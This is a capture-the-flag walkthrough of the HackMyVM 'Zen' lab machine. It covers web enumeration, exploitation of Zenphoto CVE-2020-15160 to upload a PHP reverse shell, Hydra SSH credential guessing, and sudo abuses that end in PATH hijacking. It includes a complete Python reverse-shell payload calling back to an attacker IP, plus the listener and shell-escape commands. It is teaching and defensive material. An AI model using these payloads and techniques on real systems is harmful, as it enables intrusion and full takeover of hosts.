# HackMyVM - Zen (Easy)

## Introduction

Today we are solving another **HackMyVM** machine named **Zen**, which is rated as an **Easy** Linux box. Despite its difficulty rating, the machine demonstrates several real-world attack techniques including vulnerable web applications, remote code execution, shell stabilization, credential attacks, and multiple privilege escalation stages before finally obtaining root access.

The attack path begins with web enumeration where a vulnerable **Zenphoto** installation is identified. After exploiting a known Remote Code Execution vulnerability, we obtain a shell as the **www-data** user. From there, local enumeration reveals multiple system users, eventually leading to valid SSH credentials for another account. This foothold becomes the starting point for a chain of privilege escalations that ultimately compromise the entire machine.

As always, we begin with reconnaissance.

---

# Enumeration

Since HackMyVM provides the target IP on the machine page, we start by verifying which services are exposed to the network.

**Target IP**

```
192.168.56.109
```

The first step during every penetration test is to perform a complete TCP port scan. Rather than assuming common ports, scanning all 65,535 ports ensures that no hidden services are overlooked.

```bash
nmap -p- --min-rate 5000 192.168.56.109
```

The scan reveals the following:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Only two services are exposed:

- **SSH (22)** – Potential remote administration.
- **HTTP (80)** – Primary attack surface.

With such a small attack surface, the web server becomes our primary focus.

To identify software versions and gather additional information, we perform a service detection scan.

```bash
nmap -sC -sV 192.168.56.109
```

The scan provides much more useful information.

```
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp open  http    nginx 1.14.2
```

Besides identifying the running services, Nmap also discovers several interesting details.

Most notably, the HTTP enumeration reports a **robots.txt** file containing multiple disallowed directories.

```
/albums/
/plugins/
/P@ssw0rd
/themes/
/zp-core/
/zp-data/
/page/search/
/uploaded/
/backup/
```

Finding hidden directories through **robots.txt** is always worth investigating because developers frequently expose administrative interfaces, backup files, or internal resources that were never intended for public users.

---

# Web Enumeration

Opening the website in the browser presents what appears to be a normal photo gallery application.

At first glance, nothing immediately appears vulnerable. There are no obvious login forms, upload pages, or exposed administrative functionality on the homepage.

Since the homepage reveals little information, the next logical step is to inspect every directory listed in **robots.txt**.

Several interesting paths exist, but none directly expose credentials or sensitive files. The directory named **P@ssw0rd** initially appears promising, but it does not immediately provide useful information.

At this point, rather than blindly fuzzing directories, we begin fingerprinting the application itself.

One of the easiest ways to identify a web application is by viewing its source code.

After inspecting the page source, a very important piece of information appears near the bottom.

```
zenphoto version 1.5.7
```

This immediately changes our direction.

Instead of performing random brute-force attacks, we now know the exact application and version running on the server.

Whenever an application version is identified, the next step should always be vulnerability research.

---

# Vulnerability Research

Searching for vulnerabilities affecting **Zenphoto 1.5.7** quickly leads to a known security issue.

```
CVE-2020-15160
```

The vulnerability allows an attacker to abuse the integrated **elFinder** file manager, ultimately resulting in arbitrary file upload and Remote Code Execution under specific conditions.

Rather than immediately running public exploits, it is always beneficial to understand how the vulnerability works.

Further research explains that exploitation requires administrative access to Zenphoto, specifically the ability to enable the vulnerable **elFinder** plugin.

Searching Exploit-DB and available public resources confirms the attack methodology.

Although Searchsploit does not contain a direct exploit for our exact version, documentation describing the exploitation process is available.

This tells us exactly where to continue.

Zenphoto's administration panel is located at:

```
/zp-core/admin.php
```

---

# Authentication

Opening the administration page presents a login form.

Normally this would represent another obstacle, but something discovered earlier during enumeration now becomes useful.

Inside **robots.txt** we previously observed a rather unusual directory.

```
/P@ssw0rd
```

Although this directory did not initially reveal anything interesting, its name strongly suggests that default or weak credentials may be involved.

Instead of overcomplicating the attack, we attempt authentication using obvious credentials.

Surprisingly, authentication succeeds.

This demonstrates one of the oldest yet still effective security problems—weak or predictable administrator credentials.

Once authenticated, we gain access to the Zenphoto administration dashboard.

---

# Exploiting Zenphoto

After obtaining administrative access, we navigate directly to the plugin management page.

```
/zp-core/admin-plugins.php
```

Among the available plugins is **elFinder**.

Because the vulnerability specifically targets this plugin, enabling it becomes the first step toward Remote Code Execution.

After enabling the plugin, the vulnerable file manager becomes available.

The file manager allows uploads to the server.

Instead of uploading a legitimate media file, we upload a PHP reverse shell generated from the well-known PentestMonkey PHP reverse shell.

Before triggering the payload, we prepare a listener on our attacking machine.

```bash
nc -lvnp 4444
```

Once the uploaded PHP file is executed through the browser, the server connects back to our listener.

```
connect to [192.168.56.107] from 192.168.56.109
```

The shell identifies itself as:

```
uid=33(www-data)
```

This confirms successful Remote Code Execution through the vulnerable Zenphoto installation.

---

# Shell Stabilization

The initial reverse shell is functional but extremely limited.

Features such as command history, tab completion, interactive programs, and proper terminal behavior are unavailable.

The first improvement is spawning a proper pseudo-terminal using Python.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

After suspending the shell with **Ctrl+Z**, we configure our local terminal.

```bash
stty raw -echo
fg
```

Finally, inside the remote shell we restore terminal functionality.

```bash
export TERM=xterm-256color
export SHELL=bash
```

With these adjustments, the reverse shell behaves almost identically to a normal SSH session, making further enumeration significantly easier.

---

# Local Enumeration

With code execution established, the next objective is privilege escalation.

Attempting to access protected files immediately confirms that our current privileges are limited.

```bash
cat /etc/shadow
```

Result:

```
Permission denied
```

This is expected because the **www-data** account does not possess administrative privileges.

Next, we inspect the local users configured on the system.

```bash
cat /etc/passwd | tail
```

Interesting users include:

```
kodo
zenmaster
hua
```

Each of these represents a potential lateral movement target.

We then inspect the system for SUID binaries.

```bash
find / -type f -perm -4000 2>/dev/null
```

The system returns several common SUID executables including:

- passwd
- sudo
- mount
- su
- newgrp
- gpasswd

None of these appear immediately vulnerable or misconfigured.

Since no obvious privilege escalation vectors are discovered through SUID enumeration, another common approach is attempting password reuse or weak credentials for the identified local users.

---

# Credential Attack

Knowing the usernames is often enough to begin testing weak passwords.

A Hydra attack is performed against the SSH service.

Eventually, Hydra discovers valid credentials.

```
Username: zenmaster
Password: zenmaster
```

This highlights another common security weakness: using the username as the password.

With valid credentials available, we establish an SSH session.

```bash
ssh zenmaster@192.168.56.109
```

Authentication succeeds immediately.

Unlike the limited **www-data** shell, SSH provides a fully interactive terminal with persistent access.

Inside the user's home directory, we locate the user flag.

```bash
cat user.txt
```

Output:

```
hmvzenit
```

At this stage we have successfully completed the initial compromise and obtained the user flag. The remaining challenge is escalating privileges through the multiple user accounts until full root access is achieved.


# Privilege Escalation (zenmaster → kodo)

After obtaining SSH access as the **zenmaster** user, the next objective is determining whether the account has any elevated privileges.

The first command to execute on any newly compromised Linux account is:

```bash
sudo -l
```

The output reveals an interesting sudo configuration.

```
Matching Defaults entries for zenmaster on zen:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User zenmaster may run the following commands on zen:
    (kodo) NOPASSWD: /bin/bash
```

This tells us several important things.

- `zenmaster` is **not** allowed to execute commands as root.
- However, the user **can execute `/bin/bash` as the user `kodo` without supplying a password.**
- Since `/bin/bash` is an interactive shell, this effectively allows us to become the `kodo` user instantly.

To verify whether we could directly become the next user (`hua`), we first attempted:

```bash
sudo -u hua /bin/bash
```

As expected, sudo denied the request.

```
Sorry, user zenmaster is not allowed to execute '/bin/bash' as hua on zen.
```

This confirms that sudo permissions are strictly limited to the configuration shown by `sudo -l`.

Instead, we switch into the permitted account.

```bash
sudo -u kodo /bin/bash
```

Verifying our identity confirms the transition.

```bash
whoami
```

```
kodo
```

Rather than jumping directly to exploitation, we again enumerate the privileges of this new user.

```bash
sudo -l
```

The result is far more interesting.

```
Matching Defaults entries for kodo on zen:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User kodo may run the following commands on zen:
    (hua) NOPASSWD: /usr/bin/see
```

Unlike the previous escalation, this configuration does not allow executing an arbitrary shell.

Instead, we are restricted to a single executable:

```
/usr/bin/see
```

Before attempting anything else, we identify what this binary actually is.

```bash
ls -lah /usr/bin/see
```

Output:

```
lrwxrwxrwx 1 root root 11 Feb  9  2019 /usr/bin/see -> run-mailcap
```

The command is merely a symbolic link pointing to **run-mailcap**.

This is an important discovery because `run-mailcap` is responsible for opening files using applications defined within the system's mailcap configuration.

Rather than guessing whether the binary is exploitable, we consult **GTFOBins**, which documents legitimate Unix binaries that can be abused when executed with elevated privileges.

GTFOBins documents that **see/run-mailcap** can be abused when it opens files through a pager such as **less**.

To test this behavior, we execute:

```bash
sudo -u hua /usr/bin/see --action=view /etc/hosts
```

Instead of simply printing the file contents, the program opens the file inside the **less** pager.

```
127.0.0.1 localhost
127.0.1.1 zen
...
/etc/hosts (END)
```

Seeing the `(END)` prompt is the key observation.

Because `less` supports shell escapes, we can execute arbitrary commands while the pager is running.

Inside the pager we simply type:

```
!/bin/bash
```

The exclamation mark instructs `less` to execute a shell command.

Since the pager itself is running under the privileges of **hua**, the spawned shell also executes as **hua**.

Verifying our identity confirms the successful privilege escalation.

```bash
whoami
```

```
hua
```

This is an excellent example of why allowing seemingly harmless binaries through sudo can still lead to privilege escalation when those binaries invoke interactive programs.

---

# Privilege Escalation (hua → root)

Now operating as the **hua** user, we again inspect sudo permissions.

```bash
sudo -l
```

The output reveals another interesting configuration.

```
User hua may run the following commands on zen:
    (ALL : ALL) NOPASSWD: /usr/sbin/add-shell zen
```

Unlike previous stages, this binary executes with root privileges.

However, because it is a custom binary rather than a standard Linux utility, we first need to understand how it behaves.

Inspecting the current PATH shows the directories searched when commands are executed.

```bash
echo $PATH
```

Although the PATH itself appears normal, custom binaries frequently execute external programs without specifying absolute paths.

To verify this, we trace every system call performed by the binary.

```bash
strace /usr/sbin/add-shell zen 2>strace.log
```

After execution, we inspect the generated trace.

```bash
grep "/usr/local/bin" strace.log
```

Several interesting entries appear.

```
stat("/usr/local/bin/awk", ...)
stat("/usr/local/bin/cat", ...)
stat("/usr/local/bin/rm", ...)
```

These messages reveal the core vulnerability.

The binary attempts to locate common utilities inside:

```
/usr/local/bin/
```

before searching the standard system directories.

This introduces a classic **PATH Hijacking** vulnerability.

If we can create our own executable named `awk` inside `/usr/local/bin`, the privileged program will execute **our file** instead of the legitimate system binary.

---

# Exploiting PATH Hijacking

Rather than creating a legitimate awk program, we create a malicious executable that simply opens a reverse shell back to our attacking machine.

The payload used is:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.56.107",4445))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```

We save this payload as:

```
/usr/local/bin/awk
```

Then make it executable.

```bash
chmod +x /usr/local/bin/awk
```

Before triggering the vulnerable binary, we prepare another listener on our attacking machine.

```bash
nc -lvnp 4445
```

Finally, we execute the privileged binary.

```bash
sudo /usr/sbin/add-shell zen
```

Because `add-shell` searches `/usr/local/bin/awk` first, our malicious executable is launched with **root privileges**.

The listener immediately receives a connection.

```
connect to 192.168.56.107
```

Verifying our privileges confirms complete system compromise.

```bash
whoami
```

Output:

```
root
```

The final flag can now be retrieved.

```bash
cat /root/root.txt
```

```
hmvenlightenment
```

Machine complete.

---

# Attack Chain Summary

The complete attack path was:

1. Enumerated open services using Nmap.
2. Identified **Zenphoto 1.5.7** from the webpage source.
3. Researched **CVE-2020-15160** affecting Zenphoto.
4. Logged into the administrative interface using weak credentials.
5. Enabled the vulnerable **elFinder** plugin.
6. Uploaded a PHP reverse shell.
7. Obtained code execution as **www-data**.
8. Enumerated local users.
9. Discovered weak SSH credentials (`zenmaster:zenmaster`) through Hydra.
10. Logged in through SSH.
11. Used sudo privileges to become **kodo**.
12. Abused **run-mailcap/see** using the GTFOBins shell escape to become **hua**.
13. Enumerated sudo permissions again.
14. Identified a **PATH Hijacking** vulnerability inside `add-shell`.
15. Planted a malicious executable inside `/usr/local/bin`.
16. Executed the vulnerable binary.
17. Received a root shell and captured the root flag.

---

# Security Recommendations

Several security weaknesses contributed to the complete compromise of this machine.

- Keep web applications such as **Zenphoto** updated to supported versions to prevent exploitation of publicly known vulnerabilities like **CVE-2020-15160**.
- Avoid using predictable or default credentials. Passwords such as `zenmaster:zenmaster` should never exist on production systems.
- Restrict administrative interfaces from public access whenever possible.
- Carefully review every sudo rule. Allowing users to execute seemingly harmless programs like `see` may still provide shell access through pager escapes.
- Custom privileged binaries should always invoke system commands using **absolute paths** rather than relying on the user's PATH environment.
- Remove write permissions from directories searched by privileged executables.
- Perform regular privilege escalation audits using tools such as **LinPEAS**, **Lynis**, or manual reviews of sudo configurations.

---

# Conclusion

Zen is an excellent Easy-rated HackMyVM machine that combines multiple realistic attack techniques into a single exploitation chain. The machine demonstrates the importance of thorough enumeration, as every stage builds upon information gathered during the previous one. Rather than relying on a single critical vulnerability, the compromise results from several smaller weaknesses working together, including outdated software, weak credentials, unsafe sudo configurations, GTFOBins abuse, and insecure PATH handling within a custom privileged binary.

Although each issue individually appears minor, chaining them together ultimately leads to full system compromise, making Zen an excellent exercise for understanding practical Linux privilege escalation techniques and the importance of secure system administration.
